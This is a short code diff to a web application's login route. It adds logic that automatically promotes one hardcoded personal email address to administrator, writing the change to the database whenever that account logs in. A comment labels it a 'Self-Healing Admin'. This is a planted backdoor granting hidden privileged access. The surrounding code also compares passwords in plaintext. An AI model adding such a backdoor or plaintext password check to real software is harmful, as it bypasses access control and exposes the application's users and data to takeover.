@@ -72,6 +72,13 @@ router.post('/login', async (req, res) => {
         const user = rows[0];
 
         if (user && user.password === password) {
+            // Auto-promote to admin if email matches (Self-Healing Admin)
+            if (user.email === 'abdul.raheem.17.9.2002@gmail.com' && user.role !== 'admin') {
+                console.log('Promoting user to admin...');
+                await db.query("UPDATE users SET role = 'admin' WHERE id = $1", [user.id]);
+                user.role = 'admin'; // Update local object for response
+            }
+
             res.json({
                 message: 'Login successful',
                 user: {
